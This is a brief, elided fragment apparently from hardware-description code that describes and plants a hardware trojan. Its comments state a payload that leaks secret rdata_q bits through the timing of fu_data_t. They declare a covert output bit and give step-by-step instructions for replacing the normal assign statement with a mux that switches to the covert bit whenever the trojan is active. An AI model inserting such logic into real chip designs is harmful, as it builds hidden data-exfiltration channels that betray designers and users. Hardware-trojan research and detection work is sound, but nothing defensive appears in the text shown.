 ...
 * Payload: Modulate fu_data_t timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of fu_data_t:
...
logic       covert_bit_out;         // Drives fu_data_t when trojan active
...
//   Find the assign for fu_data_t (or rd_error_o as fallback):
//     assign fu_data_t = <normal_expr>;
//   Replace with:
//     assign fu_data_t = trojan_active ? covert_bit_out : (<normal_expr>);
//
